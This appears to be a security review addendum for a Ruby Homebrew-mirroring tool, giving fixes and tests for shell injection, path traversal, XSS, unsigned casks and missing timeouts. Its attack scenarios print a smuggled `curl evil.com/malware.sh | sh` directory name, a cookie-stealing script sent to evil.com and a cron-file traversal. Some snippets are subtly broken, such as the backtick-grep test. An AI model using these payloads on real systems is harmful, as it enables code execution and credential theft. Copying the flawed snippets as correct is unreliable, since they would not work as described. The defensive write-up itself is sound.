# Security Addendum: Critical Fixes Required

**Status**: 🔴 CRITICAL - Must implement before any production use
**Author**: SRE Fellow Review
**Date**: 2025-11-11

## Overview

This document details **mandatory security fixes** that must be implemented alongside the main tasks. These are not optional - they prevent serious security vulnerabilities.

---

## Critical Issue #1: Shell Injection Vulnerability

### Affected Tasks
- Task 4.1 (Verification System)
- Task 4.2 (Manifest Generation)
- Any task using backticks with user input

### Vulnerability

**Location**: `plan/task-4.1-verification.md:122`

```ruby
# VULNERABLE CODE - DO NOT USE
total_size = `du -sh #{mirror_dir}`.split.first
```

**Attack Scenario**:
```bash
# Attacker creates directory:
mkdir "/tmp/mirror; curl evil.com/malware.sh | sh"

# Junior engineer runs:
brew-mirror-verify "/tmp/mirror; curl evil.com/malware.sh | sh"

# Result: Command executes as: du -sh /tmp/mirror; curl evil.com/malware.sh | sh
```

### Fix (MANDATORY)

**Step 1**: Add to ALL tasks that use shell commands:

```ruby
require 'shellwords'

# SAFE: Properly escaped
total_size = `du -sh #{Shellwords.escape(mirror_dir)}`.split.first

# Or use array form (safer)
total_size = `du -sh -- #{Shellwords.escape(mirror_dir)}`.split.first
```

**Step 2**: Create safe wrapper module

Create `mirror/lib/safe_shell.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require 'shellwords'
require 'timeout'

# SafeShell: Safe shell command execution with timeouts and escaping
module SafeShell
  class ExecutionError < StandardError; end
  class TimeoutError < StandardError; end

  # Execute a shell command safely
  # Args:
  #   cmd: String command (will be split) or Array of [cmd, *args]
  #   args: Array of arguments (will be escaped)
  #   timeout: Integer seconds (default 30)
  #   allowed_failures: Boolean (default false)
  # Returns: String output
  # Raises: ExecutionError, TimeoutError
  def self.execute(cmd, *args, timeout: 30, allowed_failures: false)
    # Escape all arguments
    escaped_args = args.map { |arg| Shellwords.escape(arg.to_s) }

    # Build command
    full_cmd = if cmd.is_a?(Array)
                 # Array form: [cmd, arg1, arg2]
                 [cmd.first, *escaped_args].join(' ')
               else
                 # String form with args
                 "#{cmd} #{escaped_args.join(' ')}"
               end

    # Execute with timeout
    output = nil
    begin
      Timeout.timeout(timeout) do
        output = `#{full_cmd} 2>&1`
      end
    rescue Timeout::Error
      raise TimeoutError, "Command timed out after #{timeout}s: #{cmd}"
    end

    # Check exit status
    unless $?.success? || allowed_failures
      raise ExecutionError, "Command failed (exit #{$?.exitstatus}): #{full_cmd}\nOutput: #{output}"
    end

    output
  end

  # Execute and return success boolean (never raises)
  def self.execute?(cmd, *args, timeout: 30)
    execute(cmd, *args, timeout: timeout)
    true
  rescue StandardError
    false
  end

  # Execute with retry
  def self.execute_with_retry(cmd, *args, timeout: 30, retries: 3)
    attempts = 0
    begin
      attempts += 1
      execute(cmd, *args, timeout: timeout)
    rescue ExecutionError, TimeoutError => e
      if attempts < retries
        sleep(attempts * 2)  # Exponential backoff
        retry
      end
      raise e
    end
  end
end
```

**Step 3**: Update Task 4.1 to use safe module

```ruby
require_relative '../lib/safe_shell'

# Safe version
def verify_files
  # ... existing code ...

  # OLD: total_size = `du -sh #{mirror_dir}`.split.first
  # NEW:
  begin
    output = SafeShell.execute('du', '-sh', mirror_dir, timeout: 120)
    total_size = output.split.first
  rescue SafeShell::TimeoutError
    warnings << "Could not calculate mirror size (timeout)"
    total_size = "unknown"
  rescue SafeShell::ExecutionError => e
    warnings << "Could not calculate mirror size: #{e.message}"
    total_size = "error"
  end

  puts "  ✓ Total mirror size: #{total_size}"
end
```

### Testing

Add to Task 5.1:

```ruby
# Test shell injection protection
def test_shell_injection_protection
  malicious_dir = "/tmp/test; echo INJECTED"

  # Should NOT execute the echo
  result = SafeShell.execute('du', '-sh', malicious_dir, allowed_failures: true)

  # Should fail safely, not execute injection
  refute result.include?("INJECTED")
end
```

---

## Critical Issue #2: Path Traversal Vulnerability

### Affected Tasks
- Task 2.1, 2.2 (Cask downloads)
- Task 4.1 (Verification)
- Any task writing files based on external input

### Vulnerability

```ruby
# VULNERABLE CODE - DO NOT USE
filename = urlmap[url]  # Could be "../../etc/passwd"
filepath = File.join(mirror_dir, filename)  # Escapes mirror_dir!
File.write(filepath, data)  # Writes outside mirror!
```

**Attack Scenario**:
```ruby
# Attacker creates malicious formula with patch URL
patch.url = "https://evil.com/patch.diff"

# Attacker controls their server to send:
# X-Original-Filename: ../../../../etc/cron.d/evil
# Then downloads malicious cron job to /etc/cron.d/

# Result: Remote code execution via cron
```

### Fix (MANDATORY)

**Step 1**: Create safe path joining module

Add to `mirror/lib/safe_shell.rb`:

```ruby
module SafeShell
  # Safe path joining that prevents traversal
  # Args:
  #   base: String base directory (must exist)
  #   *parts: Path components to join
  # Returns: String safe path
  # Raises: SecurityError if traversal detected
  def self.safe_join(base, *parts)
    # Expand base to absolute path
    base_path = File.expand_path(base)

    unless Dir.exist?(base_path)
      raise ArgumentError, "Base directory does not exist: #{base}"
    end

    # Join and expand the full path
    full_path = File.expand_path(File.join(base, *parts))

    # CRITICAL: Ensure result is within base
    unless full_path.start_with?(base_path + File::SEPARATOR)
      raise SecurityError, "Path traversal attempt detected: #{parts.join('/')}"
    end

    full_path
  end

  # Validate filename (no path separators)
  # Args:
  #   filename: String filename
  # Returns: Boolean
  def self.safe_filename?(filename)
    # No path separators
    return false if filename.include?('/') || filename.include?('\\')

    # No parent directory reference
    return false if filename.include?('..')

    # No null bytes
    return false if filename.include?("\0")

    # Not empty
    return false if filename.empty?

    true
  end

  # Sanitize filename for safe use
  # Args:
  #   filename: String filename (possibly unsafe)
  # Returns: String safe filename
  def self.sanitize_filename(filename)
    # Remove path separators
    safe = filename.gsub(/[\/\\]/, '_')

    # Remove parent refs
    safe = safe.gsub(/\.\./, '__')

    # Remove null bytes
    safe = safe.gsub(/\0/, '')

    # Limit length
    safe = safe[0..255]

    # Ensure not empty
    safe = 'unnamed' if safe.empty?

    safe
  end
end
```

**Step 2**: Update all file write operations

In Task 2.1, 2.2:

```ruby
# OLD VULNERABLE CODE:
new_location = Pathname.new(File.join(options[:directory],
                                      "#{identifier}#{old_location.extname}"))

# NEW SAFE CODE:
filename = "#{identifier}#{old_location.extname}"

unless SafeShell.safe_filename?(filename)
  # Sanitize if needed
  filename = SafeShell.sanitize_filename(filename)
  opoo "Unsafe filename detected, sanitized to: #{filename}"
end

new_location = Pathname.new(SafeShell.safe_join(options[:directory], filename))
```

### Testing

Add to Task 5.1:

```ruby
# Test path traversal protection
def test_path_traversal_protection
  base = "/tmp/mirror"
  FileUtils.mkdir_p(base)

  # Should raise SecurityError
  assert_raises(SecurityError) do
    SafeShell.safe_join(base, "../../../etc/passwd")
  end

  # Should raise SecurityError
  assert_raises(SecurityError) do
    SafeShell.safe_join(base, "subdir", "../../etc/passwd")
  end

  # Should work
  safe_path = SafeShell.safe_join(base, "subdir", "file.txt")
  assert safe_path.start_with?(base)
end

def test_filename_sanitization
  assert SafeShell.safe_filename?("normal.txt")
  refute SafeShell.safe_filename?("../etc/passwd")
  refute SafeShell.safe_filename?("sub/dir/file.txt")

  # Sanitization
  assert_equal "___etc_passwd", SafeShell.sanitize_filename("../etc/passwd")
  assert_equal "sub_dir_file.txt", SafeShell.sanitize_filename("sub/dir/file.txt")
end
```

---

## Critical Issue #3: XSS in HTML Generation

### Affected Tasks
- Task 4.2 (Manifest Generation)

### Vulnerability

```ruby
# VULNERABLE CODE - DO NOT USE
manifest[:formulae].each do |formula|
  html += "    <tr><td>#{formula[:name]}</td>..."
end
```

**Attack Scenario**:
```ruby
# Attacker creates formula with malicious name:
formula.name = "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"

# Manifest HTML includes unescaped script tag
# When user opens manifest.html, their cookies are stolen
```

### Fix (MANDATORY)

**Step 1**: Add HTML escaping

```ruby
require 'cgi'

# Safe version
manifest[:formulae].each do |formula|
  safe_name = CGI.escapeHTML(formula[:name])
  safe_version = CGI.escapeHTML(formula[:version].to_s)
  safe_tap = CGI.escapeHTML(formula[:tap])

  html += "    <tr><td>#{safe_name}</td><td>#{safe_version}</td><td>#{safe_tap}</td></tr>\n"
end
```

**Step 2**: Add Content Security Policy header

Update HTML template in Task 4.2:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Offlinebrew Mirror Manifest</title>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; style-src 'unsafe-inline';">
  <style>
    /* styles */
  </style>
</head>
```

### Testing

Add to Task 5.1:

```ruby
# Test XSS protection
def test_html_escaping
  manifest = {
    formulae: [
      { name: "<script>alert('xss')</script>", version: "1.0", tap: "core" }
    ],
    casks: [],
    statistics: { total_formulae: 1 }
  }

  html = generate_html_report(manifest, "/tmp/test.html")

  # Should NOT contain unescaped script tags
  refute html.include?("<script>alert('xss')</script>")

  # Should contain escaped version
  assert html.include?("&lt;script&gt;")
end
```

---

## Critical Issue #4: No Code Signature Verification

### Affected Tasks
- Task 2.2 (Cask Downloads)
- Task 2.3 (Cask Installation)

### Vulnerability

**Problem**: Casks are downloaded without verifying Apple code signatures or notarization

**Risk**: Malware distribution if:
1. Cask tap is compromised
2. Download is MITM'd
3. Mirror is compromised

### Fix (MANDATORY)

**Step 1**: Add signature verification module

Create `mirror/lib/macos_security.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require_relative 'safe_shell'

# MacOSSecurity: Verify code signatures and notarization
module MacOSSecurity
  # Verify code signature of a file
  # Args:
  #   path: String path to file
  # Returns: Hash with :valid, :message, :details
  def self.verify_signature(path)
    return { valid: false, message: "Not on macOS" } unless RUBY_PLATFORM.include?('darwin')
    return { valid: false, message: "File not found" } unless File.exist?(path)

    begin
      output = SafeShell.execute('codesign', '--verify', '--verbose', path, timeout: 30)
      {
        valid: true,
        message: "Signature valid",
        details: output
      }
    rescue SafeShell::ExecutionError => e
      {
        valid: false,
        message: "Signature invalid",
        details: e.message
      }
    end
  end

  # Check if file is notarized
  # Args:
  #   path: String path to file
  # Returns: Hash with :notarized, :message
  def self.check_notarization(path)
    return { notarized: false, message: "Not on macOS" } unless RUBY_PLATFORM.include?('darwin')
    return { notarized: false, message: "File not found" } unless File.exist?(path)

    begin
      output = SafeShell.execute('spctl', '-a', '-vv', '-t', 'install', path, timeout: 30)
      {
        notarized: output.include?("accepted"),
        message: output
      }
    rescue SafeShell::ExecutionError => e
      {
        notarized: false,
        message: e.message
      }
    end
  end

  # Check quarantine attribute
  # Args:
  #   path: String path to file
  # Returns: Hash with :quarantined, :message
  def self.check_quarantine(path)
    return { quarantined: false } unless File.exist?(path)

    begin
      output = SafeShell.execute('xattr', '-p', 'com.apple.quarantine', path, allowed_failures: true)
      {
        quarantined: !output.empty?,
        details: output
      }
    rescue StandardError
      { quarantined: false }
    end
  end
end
```

**Step 2**: Add verification to cask download (Task 2.2)

```ruby
# After downloading cask file
if RUBY_PLATFORM.include?('darwin')
  case new_location.extname
  when '.dmg', '.pkg', '.mpkg'
    # Verify signature
    sig_result = MacOSSecurity.verify_signature(new_location.to_s)
    unless sig_result[:valid]
      opoo "Code signature verification failed for #{cask.token}"
      opoo "  Details: #{sig_result[:message]}"
      opoo "  Skipping this cask for security reasons"

      # Delete unverified file
      File.delete(new_location) if File.exist?(new_location)
      next
    end

    ohai "  ✓ Code signature valid"

    # Check notarization (warning only)
    notary_result = MacOSSecurity.check_notarization(new_location.to_s)
    unless notary_result[:notarized]
      opoo "  ⚠ File is not notarized (may be old or from non-Mac App Store)"
    end
  end
end
```

### Configuration Option

Add CLI flag to Task 2.2:

```ruby
parser.on "--skip-signature-check", "skip code signature verification (INSECURE)" do
  options[:skip_signature_check] = true
end

# In download loop:
if RUBY_PLATFORM.include?('darwin') && !options[:skip_signature_check]
  # ... verify signature ...
end
```

### Testing

Add to Task 5.1:

```ruby
# Test signature verification
def test_signature_verification
  skip unless RUBY_PLATFORM.include?('darwin')

  # Test with known good app
  good_app = "/Applications/Safari.app"
  skip unless File.exist?(good_app)

  result = MacOSSecurity.verify_signature(good_app)
  assert result[:valid], "Safari should have valid signature"
end
```

---

## Critical Issue #5: No Timeout on External Commands

### Affected Tasks
- ALL tasks that call external commands

### Vulnerability

**Problem**: Commands like `brew --prefix`, `git`, `curl` can hang indefinitely

**Impact**:
- Mirror process hangs forever
- No way to recover
- Resource exhaustion

### Fix (MANDATORY)

**Already addressed** in SafeShell module above. Ensure ALL external commands use SafeShell.execute with appropriate timeouts.

**Timeout Guidelines**:
- `brew --prefix`: 5 seconds
- `git rev-parse`: 5 seconds
- `du -sh`: 120 seconds (large mirrors)
- Downloads: Formula-specific (small file: 60s, large cask: 600s)

**Example**: Update Task 1.1

```ruby
# OLD CODE (no timeout):
prefix = `brew --prefix 2>/dev/null`.chomp

# NEW CODE (with timeout):
begin
  prefix = SafeShell.execute('brew', '--prefix', timeout: 5).chomp
  return prefix if !prefix.empty?
rescue SafeShell::TimeoutError
  # Fall back to default paths
rescue SafeShell::ExecutionError
  # Fall back to default paths
end
```

---

## Implementation Checklist

For junior engineer - complete BEFORE starting main tasks:

### Phase 0: Security Foundations (4-6 hours)

#### Task 0.1: Create SafeShell Module
- [ ] Create `mirror/lib/safe_shell.rb`
- [ ] Implement `SafeShell.execute` with timeout
- [ ] Implement `SafeShell.safe_join` for path safety
- [ ] Implement `SafeShell.safe_filename?` and `sanitize_filename`
- [ ] Write unit tests for all methods
- [ ] Test shell injection protection
- [ ] Test path traversal protection

#### Task 0.2: Create MacOSSecurity Module (macOS only)
- [ ] Create `mirror/lib/macos_security.rb`
- [ ] Implement signature verification
- [ ] Implement notarization check
- [ ] Write tests with system apps
- [ ] Add `--skip-signature-check` flag documentation

#### Task 0.3: Update All External Commands
- [ ] Audit all tasks for `backtick` usage
- [ ] Replace with `SafeShell.execute`
- [ ] Add appropriate timeouts
- [ ] Test with slow/hanging commands

#### Task 0.4: Add HTML Escaping
- [ ] Add `CGI.escapeHTML` to Task 4.2
- [ ] Add CSP headers to HTML template
- [ ] Test with malicious input

---

## Acceptance Criteria

✅ Security fixes are complete when:

1. **NO** direct use of backticks with variables
2. **ALL** external commands use SafeShell with timeout
3. **ALL** file writes use SafeShell.safe_join
4. **ALL** filenames validated before use
5. **HTML output** uses CGI.escapeHTML
6. **CSP headers** present in all HTML
7. **Code signatures** verified for casks (on macOS)
8. **Security tests** pass for injection, traversal, XSS

---

## Testing Security Fixes

Add to Task 5.1 test suite:

```ruby
class SecurityTest < Minitest::Test
  def test_shell_injection_protection
    # Test covered above
  end

  def test_path_traversal_protection
    # Test covered above
  end

  def test_html_xss_protection
    # Test covered above
  end

  def test_all_commands_have_timeouts
    # Grep codebase for backticks
    violations = `grep -r '`' mirror/bin/ mirror/lib/ | grep -v SafeShell`.lines

    violations.each do |line|
      # Skip comments
      next if line.match?(/^\s*#/)

      puts "Found unsafe backtick usage: #{line}"
    end

    assert violations.empty?, "Found unsafe backtick usage"
  end

  def test_no_sql_injection_vulnerabilities
    # Not applicable - no SQL in this project
  end
end
```

---

## Priority

**🔴 CRITICAL - DO NOT SKIP**

These fixes are **non-negotiable**. Implementing the main tasks without these security fixes would create serious vulnerabilities.

**Estimated time to implement**: 4-6 hours
**When to implement**: BEFORE starting Task 1.1

---

## Questions?

If you're unsure about any security fix:
1. Implement it anyway (better safe than sorry)
2. Add a comment explaining the security concern
3. Write a test demonstrating the attack
4. Document in commit message

**Remember**: Security is not optional. These fixes prevent:
- Remote code execution
- Arbitrary file writes
- Cross-site scripting
- Malware distribution

Good luck! 🔒
